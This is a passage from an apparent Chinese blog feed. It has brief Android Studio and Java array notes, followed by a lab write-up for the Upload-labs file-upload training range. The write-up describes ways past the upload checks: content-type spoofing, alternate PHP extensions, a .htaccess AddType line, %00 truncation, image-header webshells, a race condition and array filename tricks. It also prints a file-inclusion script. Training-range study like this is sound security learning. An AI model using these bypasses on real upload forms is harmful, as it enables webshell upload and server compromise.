    <content type="html"><![CDATA[<h1 id="Android-Studio-目录讲解"><a href="#Android-Studio-目录讲解" class="headerlink" title="Android Studio 目录讲解"></a>Android Studio 目录讲解</h1><h2 id="project目录下文件含义"><a href="#project目录下文件含义" class="headerlink" title="project目录下文件含义"></a>project目录下文件含义</h2><h3 id="app"><a href="#app" class="headerlink" title="app"></a>app</h3><p>build</p><p>libes 第三方jar包</p><h4 id="src"><a href="#src" class="headerlink" title="src"></a>src</h4><p>androidTest  编写测试用例</p><h5 id="main"><a href="#main" class="headerlink" title="main"></a>main</h5><p>java 放置所以java</p><p>res draw放置图片mip图标 layout布局 value字符串等</p><p>AndroidManifest.xml 注册所有活动，没有注册无法运行</p><p>test</p><p>.gitignore</p><p>build.gradle</p><p>proguard-rules.pro 指定代码混淆规则</p><h3 id="gradle"><a href="#gradle" class="headerlink" title="gradle"></a>gradle</h3><p>.gitignore 将指定的目录和版本排除在外</p><p>build.gradle 项目全局的gradle脚本</p><p>gradle.properties 全局配置文件</p><p>gradlew 在linux和mac系统中使用</p><p>gradlew.bat 是在window中使用的</p><p>local.properties 指定sdk的位置</p><p>setting.gradle 指定项目中引用模块的组合</p><h2 id="常用文件"><a href="#常用文件" class="headerlink" title="常用文件"></a>常用文件</h2><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 设置图标 --&gt;</span><br>android:icon=&quot;@mipmap/ic_launcher&quot;<br><span class="hljs-comment">&lt;!-- 引用布局为@layout/**** --&gt;</span><br><span class="hljs-comment">&lt;!-- 引用字符串为@string/**** --&gt;</span><br>android:label=&quot;@string/app_name&quot;<br>android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;<br>android:supportsRtl=&quot;true&quot;<br>android:theme=&quot;@style/Theme.MyApplication&quot;&gt;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java_base 数组的三种初始化及内存变化分析</title>
    <link href="/2021/03/30/Java/JavaBase/java_base%20%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%89%E7%A7%8D%E5%88%9D%E5%A7%8B%E5%8C%96%E5%8F%8A%E5%86%85%E5%AD%98%E5%8F%98%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <url>/2021/03/30/Java/JavaBase/java_base%20%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%89%E7%A7%8D%E5%88%9D%E5%A7%8B%E5%8C%96%E5%8F%8A%E5%86%85%E5%AD%98%E5%8F%98%E5%8C%96%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="java基础–数组三种初始化及内存分析"><a href="#java基础–数组三种初始化及内存分析" class="headerlink" title="java基础–数组三种初始化及内存分析"></a>java基础–数组三种初始化及内存分析</h1><h2 id="1-声明数组"><a href="#1-声明数组" class="headerlink" title="1.声明数组"></a>1.声明数组</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] array=<span class="hljs-keyword">null</span>;<br></code></pre></div></td></tr></table></figure><h2 id="2-创建数组"><a href="#2-创建数组" class="headerlink" title="2.创建数组"></a>2.创建数组</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">array=<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">11</span>];<br></code></pre></div></td></tr></table></figure><p><strong>声明及创建</strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] num=<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">11</span>];<br><span class="hljs-comment">//直接初始化</span><br><span class="hljs-keyword">int</span>[] num=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;;<br></code></pre></div></td></tr></table></figure><h2 id="3-给数组元素赋值"><a href="#3-给数组元素赋值" class="headerlink" title="3.给数组元素赋值"></a>3.给数组元素赋值</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>    nums[i]=i+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>将图片中赋值，没有赋值的为null或0。</p>]]></content>
    
    
    <categories>
      
      <category>Java JavaBase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传靶场——Upload-labs</title>
    <link href="/2021/03/07/%E4%BF%A1%E5%AE%89/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0_upload-labs/"/>
    <url>/2021/03/07/%E4%BF%A1%E5%AE%89/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0_upload-labs/</url>
    
    <content type="html"><![CDATA[<h1 id="upload-labs靶场记录"><a href="#upload-labs靶场记录" class="headerlink" title="upload-labs靶场记录"></a>upload-labs靶场记录</h1><h1 id="php上传部分"><a href="#php上传部分" class="headerlink" title="php上传部分"></a>php上传部分</h1><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>根据提示为前端js进行检查<br>1.直接利用F12进行检查将检查部分 checkFile()删除后直接上传php文件即可<br>2.先将文件后缀改为白名单中的文件类型，之后抓包进行修改为php。直接将图中部分改为php上传即可。<br><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211016002516.jpg" alt="演示信息"></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>根据源码提示</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"> <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>)<br>|| (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) <br>|| (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>)) &#123;<br></code></pre></div></td></tr></table></figure><p>是根据content-type进行过滤，在上传过程中将该部分改为image/jpeg即可<img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211016002555.jpg"></p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>根据源码提示过滤了常见的文件类型</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);<br><span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>))<br></code></pre></div></td></tr></table></figure><p>将文件类型改为其他常见的php后缀 .phtml .phps .php3 .php5 .pht等</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>根据源码提示过滤了大部分的的文件类型</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>但是没有过滤 .htaccess，将.htaccess文件内容修改为：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">AddType application/x-httpd-php .abc<br></code></pre></div></td></tr></table></figure><p>上传后服务器可以将后缀为abc的解析为php文件，结果如图：<img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211016002609.jpg"></p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>根据源码提示过滤了大部分的的文件类型，包括.htaccess<br>但是.ini没有在黑名单中了，参照第四关方法先设置后上传ini文件及abc文件即可</p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>根据源码提示，该关没有了统一小写字母的代码，将文件名后缀进行大小写的组合来进行绕过。</p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>根据源码提示，该关没有了去除空格的检测，直接抓包后在文件后缀最后加上空格即可绕过。<br>相关知识：Windows系统下，对于文件名中空格会被作为空处理，程序中的检测代码却不能自动删除空格。从而绕过黑名单。即必须在抓包情况下增加空格。</p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>根据源码提示，该关没有了去除末尾小数点的代码，直接抓包后在文件后缀最后加上 . 即可绕过。<br>相关知识：Windows系统下，文件后缀名最后一个点会被自动去除。</p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>根据源码提示，该关没有了去除末尾::$DATA的代码，直接抓包后在文件后缀最后加上::$DATA即可绕过。<br>相关知识：php在windows下如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名不变</p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>根据源码提示，前面的方法都不可行。根据显示的代码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br> <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br> <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br> <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br><span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br></code></pre></div></td></tr></table></figure><p>在后缀加上 . . 可以直接进行绕过，该方法基本适用于前面的关卡。</p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>根据根据源码提示</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);<br><span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);<br></code></pre></div></td></tr></table></figure><p>是将黑名单中的后缀替换为空，将后缀名改为pphphp可以绕过</p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>前提要求：PHP %00截断（php版本 &lt; 5.3.4且magic_quotes_gpc=Off）<br>根据代码提示：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br></code></pre></div></td></tr></table></figure><p>可以利用$_GET[‘save_path’]进行存储路径的设置<br>进行抓包，将路径设置为：../upload/tmp.php%00<br><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211016002629.jpg"><br>注意此时上传后，直接显示的图片路径需要删除后面部分才可以进行访问。</p><p>相关知识：在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>根据代码提示：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br></code></pre></div></td></tr></table></figure><p>可以利用$_POST[‘save_path’]进行存储路径的设置<br>进行抓包，将路径设置为：../upload/tmp.php%00 </p><p>由于post不会对%00进行自动解码，因此需要手动修改二进制</p><p>先在抓包文件添加/tmp.php之后在二进制中修改较为轻松。</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211016002647.jpg"><br>之后在二进制中修改将0d改为00</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211016002659.jpg"></p><h1 id="图片木马上传"><a href="#图片木马上传" class="headerlink" title="图片木马上传"></a>图片木马上传</h1><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>根据代码提示：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$bin</span> = fread(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span><br><span class="hljs-variable">$strInfo</span> = @unpack(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);    <br><span class="hljs-variable">$typeCode</span> = intval(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);      <br></code></pre></div></td></tr></table></figure><p>只读文件的前面两个字节，利用winhex在文件前面增加两个字节。</p><p>jpg为：FF D8<br>png为：89 50<br>gif为：47 49</p><p>上传成功后利用upload-labs本身设置的文件包含漏洞进行测试。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//include.php</span><br>header(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    show_source(<span class="hljs-keyword">__file__</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>使用方法：include.php?file=upload/***(上传的图片木马路径)</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211016002717.jpg"></p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>根据源代码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$info</span> = getimagesize(<span class="hljs-variable">$filename</span>);<br><span class="hljs-variable">$ext</span> = image_type_to_extension(<span class="hljs-variable">$info</span>[<span class="hljs-number">2</span>]);<br></code></pre></div></td></tr></table></figure><p>相关知识：</p><p>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。<br>image_type_to_extension — 根据指定的图像类型返回对应的后缀名。<br>利用winhex在原本的图片文件下增加php代码，再利用文件包含进行测试。</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211016002731.jpg"></p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>前提条件：PHP要开启exif模块<br>根据代码，和15关相似也是在图片文件后面进行添加，之后利用文件包含漏洞进行测试。</p><p>相关知识：exif_imagetype()函数是PHP中的内置函数，用于确定图像的类型。</p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>根据代码提示：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//jpeg</span><br><span class="hljs-variable">$im</span> = imagecreatefromjpeg(<span class="hljs-variable">$target_path</span>);<br>imagejpeg(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><span class="hljs-comment">//png及gif类似代码</span><br></code></pre></div></td></tr></table></figure><p>先尝试随意上传一张图片，再将上传后的图片下载下来，将原来的图片和上传后的图片进行对比，找到没有改变的地方进行插入php语句。</p><p>相关知识：</p><p>imagecreatefromjpeg — 由文件或 URL 创建一个新图象。<br>imagejpeg() 从 image 图像以 filename 为文件名创建一个 JPEG 图像</p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>根据网上的提示，该关卡考察条件竞争，再根据源代码可以了解到，文件会先上传服务器，再进行类型判断若在白名单则重命名，否则就进行删除。</p><p>此时利用brupsuite的intrude功能，设置上传文件和访问文件的两个攻击不断重复，直到可以访问出现的新文件。</p><p>上传文件的代码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//访问后会新生成一个php文件</span><br>fputs(fopen(<span class="hljs-string">&quot;tmp.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>);<br></code></pre></div></td></tr></table></figure><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>根据源代码，可以知晓对于上传的文件先进行判断再进行上传，所以还是利用前面关卡的漏洞直接再图片文件后面增加php代码即可。</p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>根据代码，该关卡我们可以自己定义文件名，并且没有详细的检测代码。<br>可以使用后缀大小写绕过，后缀加.，和抓包后加空格等等前面的方式进行上传。</p><h2 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h2><p>根据代码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//首先进行content-type检测</span><br><span class="hljs-variable">$allow_type</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/gif&#x27;</span>);<br> <span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],<span class="hljs-variable">$allow_type</span>))&#123;<br>     <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该类型文件!&quot;</span>;<br> &#125;<br> <span class="hljs-comment">//再对post上传的save_name进行判断</span><br> <span class="hljs-variable">$file</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>]) ? <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br> <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$file</span>)) &#123;<br>     <span class="hljs-variable">$file</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>, strtolower(<span class="hljs-variable">$file</span>));<br> &#125;<br><br> <span class="hljs-variable">$ext</span> = end(<span class="hljs-variable">$file</span>);<br> <span class="hljs-variable">$allow_suffix</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br> <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>)) &#123;<br>     <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该后缀文件!&quot;</span>;<br>&#125;<br> <span class="hljs-comment">//最后路径命名代码</span><br> <span class="hljs-variable">$file_name</span> = reset(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[count(<span class="hljs-variable">$file</span>) - <span class="hljs-number">1</span>];<br></code></pre></div></td></tr></table></figure><p>首先对于conten-type的绕过直接在抓包中修改即可。<br>根据代码，将save_name上传时修改为数组较为方便。<br>相关知识：<br>reset() 输出数组中的当前元素和下一个元素的值，然后把数组的内部指针重置到数组中的第一个元素：</p><p>最后根据命名代码，更改save_name数组如下<br>save_name[0]:tmp.php<br>save_name[2]:jpg</p><p>最后拼接为<br>tmp.php.(由于$file[count(file)-1]为sava_name[1]为空)<br><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211016002748.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>信安 CTF Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
